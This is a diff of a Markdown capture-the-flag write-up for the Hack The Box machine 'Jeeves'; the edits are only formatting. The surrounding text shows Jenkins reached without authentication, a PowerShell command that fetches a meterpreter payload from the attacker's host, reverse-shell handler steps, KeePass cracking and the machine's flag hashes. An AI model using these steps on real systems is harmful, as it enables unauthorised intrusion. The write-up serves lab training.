@@ -6,7 +6,7 @@ tags: HTB, groovy, rottenpotato, john2keepass
 ---
 
 # Recon
-- Nmap
+Nmap
 ```ruby
 PORT      STATE SERVICE      VERSION
 80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
@@ -19,13 +19,13 @@ PORT      STATE SERVICE      VERSION
 50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
 |_http-server-header: Jetty(9.4.z-SNAPSHOT)
 ```
-- We use Dirbuster to find out the directories running on port 50000
+We use Dirbuster to find out the directories running on port 50000
 ![](https://lh3.googleusercontent.com/_afaZLU2r7PSsRJNlxpfM8UkyjsVbg6g8-1q85Q31pA-5CB_W0-cBRwACFTsE3cod1P26WJo78fFhm3EfoTMnTRoUzNeu223cJ20e1OGONEm8cr4S32otLqEsOEmdKU-va4vkY8eYdc1yCsL0H5tTxNEs5G595qg540jwIVNptwK2XqpEf3jtUgdMY7dt-wPnFLbydXqY05RKIRAvS5uCc9gzmYazY2XIDJY4ytIXmW-z0rGHLZeYilfeoZGdkaY5ei7P8ja2Pv2SL4aPq2lINQL5zS7_H18WLcY-pGSGe9yooMTpZlH5W45fsqn5eA4daF0OZ8bGnSBJJeJTyJT05KXz-CGwsJtEWxmbyTJzrN0IhkEE5nZl0XJ1gPTzuv4kNDFP1OvDefKYTLL3fKxJZZoVKtW7SJAdye7Ul6NimfGXyGvGnrdJIi--lQpKuS9wilTDRAHw6R7pWc13AjelcsL0LtUc-1s8tDxV02KJm-KdHXEDXUviW5n915DxNK8gfRnCdnR5i9qtiz0rqaB0F6kJ114EhwwC4qMKfnyu42rMQbGrebQXGLQRqY2-O41EG7Fp5t_NgJFq3Ulin7nbT3NzRfqM8N5SuCwPYhCqQBlsWF824xZzqonarSURAPU0hAoBmsF-UWXB0HfV9m11tdDJU-OycSAgW5daX-ty4aSU2LiT2a7IvA=w584-h209-no)
 
-- /askjeeves/ has a Jekins app running
+/askjeeves/ has a Jekins app running
 ![](https://lh3.googleusercontent.com/Jj_T1StwVe2aThqjKb8ybZ3Ythca4n9qyXUwzI0SnGlu_QoIU1wknCBMWre8iu7hq7qx27D6Ypo_rGBWsguoiwYiEnNMpYlMirqT_HUIzl6QQcoS0bbg7oLsAfc57D8iOVkh9sUiOzVxJ2TkPTa_TIUhwSpNhZE5OHkEJwKiZJs5VCuV9hflHd5vXp4mM8iDlhdEMYotLpDtuQRxxjwXotZyfQtWy59PAcGn1mzTPyTbBNwxkIBlYf_HxMXugwl8P25YDWc8Gqei_npEvzSFTIEwGrbdy-XeW-jk0HZoJ2TwherUMO01qV7ITn-v4_uX5GbLhgKP3iMqy2VqtjYGNVRn28nseTHok0AN9sRcoSIyTaPqUn_-5ErL2h3_JIipQSetVYsosRv55wCUVji94bKP8HDPnKuhGKwt_87D9E2SRo9OL4sHs9EaHsBzfxVmZSEDK1pZJ6NEhZsOmzWeuOjjOpXOojvpP32C09eKfymOJHtKTCZ_PR2Edr9xSVuewwRZ605eCjPYjbkTU5FN3zjoKinaUTkCreIqnc_AIVmNp2fwDtYtS_AdWCg3gJJ5iaWjB4sxo4iKw1D9Pm2gzYno3pJ8exVsC8aDZKB7uZU9UWH4YMivbUSS2HjmJz_cLeWBUDEirs-8FiumgfXEwQuabGMbi5cjEHkDilL8PXhLXPtjEGoWqEA=w632-h364-no)
 
-- To get admin without authenticating:
+To get admin without authenticating:
 ```ruby
 http://10.10.10.63:50000/askjeeves/securityRealm/user/admin/
 ```
@@ -40,9 +40,9 @@ powershell wget "http://10.10.14.14/peterpreter.exe" -outfile "meterpreter.exe"
 ```
 ![](https://lh3.googleusercontent.com/YDkMzr-vtiHmFXOcfFhQ-jH7jwJHqIA4mG4VtCR5_4V5ddTdi5DNFvuYu0_iUxyFGg0mYeDa01p2dWkin60m-wXyvGVl3T2jdiAD9fkGPeCyQRobjP6idpoJ1euKxPaDeQpy-KF7P049lf4x61VASqfhxHpgX_Te_1K7_KPRhIUCwyOzxlwtcKH5y891IF2gyIJk6qNwPyGUgfypQLVWTBzUksJfSUE_dfyOFUWeUVQtK5dSw4YHeNRKlHUu_wZkRf8uRfpuiiCbZnCrYJo08-ZVSDvq7WLYLP7_sfMQvybWlsuXdM8ey_4fyVJutkeu2oYdXRDtBOU22ZROYG5N5kXXvo-8dfKJlhJIC_LMCmEbO7vYjekIXCfJUnHfGwvuf92By4OASnShb63mQpC0ELRs0U0u5WYWkAWBKJdYrxLabjuwjt6dqT_PIjeq9wbrdLlLvN0Zt4ylq_wiyrMLLdrs-EecKC-BDNc24pwU1ZQA1Xkg3JNWCzAYWKV82N8E5QfKroZoWkgWRspDH-x-r3_Y4PFNMBzG7NAhDh2FHsm_aUZgXZubmhmbdAkRfSg5oGgrVTcCdDVhGPYFpglpjAX_7f6_29ZLRUWzdAf29SOyfeDORA_g6Wnu9sY32BjpIeKENlQKpSVjiz9UwepfZDeMxUq_7_HHO_tWEu7MDk3T5Kf8TrIGo9s=w970-h314-no)
 
-- Start apache and place meterpreter.exe file for download 
-- Set up multi/handler
-- Run the shell on jenkins 
+Start apache and place meterpreter.exe file for download 
+Set up multi/handler
+Run the shell on jenkins 
  
 # Privilege Escalation Method 1
 - Download CEH.kdbx keepass file and use john2keepass to create a hashdump file
@@ -113,7 +113,7 @@ and finally we get root level access.
 ![](https://lh3.googleusercontent.com/zBWypHEBhLc6rJr4e0nfdaRSeTA51f4sOLArH4Jz_UlHQR7wxJ90Lsz4ohA_CoQv0AIDnwycooSnaCz9CqBnRHbzA80EkXYQa5cDtEIaCr06jkCFDl9P0Nz8n94mriplK7pPnNix-Pqbl1XHr5V4lnkVIHBch-K7NoazKkcKnxk9lsIwJcVNc_6w9JAy7muxtJHZnk0e29zCjKQnzJKtSb3Fmq-dq1RoeHWBiT4yv7bbehtyvzSUHhDCrEC040zNh5QNeUMNyUikSoylSkyk5b1sOks-qb5JuwdNAQPqhyPfjNcuPB9vs4ARnBOHwZtPZ6ML9fkYCdkhTYx__nEj1hxXPwXX8lSQMU6DyfVzsL3Yig6vlHFtvoYxgyUUlUx7cknjgoLm7ZYTJ6KqhiWmSFhb7cAjZpLC07V9_h90PReJ7KgFP0CQ2cXUOZpjzzrf5-nqDhbZXh9QAFJ7qbjRqeQ6c-E9aMn6dkdV6ONRqMrbw9P3HI6tGonaXaRa6tl4mYfB2aKQHf5t_uQ9oYzIdPGP0vz26cLW4wS2cm-wzGzn1nN5228YVD4Ju3n6q6xCGolE9LMzyPc5H_RACVnResBfUgvp8O-jt9pC3QrSy16t1kb2h0d8aNjbgonKh2J7wKKz4S7I8qx7BnkEyfH859uIb3V_1Ef8GlyEytzBJMf-q7x9ZeZOXxA=w656-h308-no)
 
 # Flags
-```SHELL
+```shell
  ROOT  "afbc5bd4b615a60648cec41c6ac92530" 
  USER  "e3232272596fb47950d59c4cf1e7066a" 
 ```
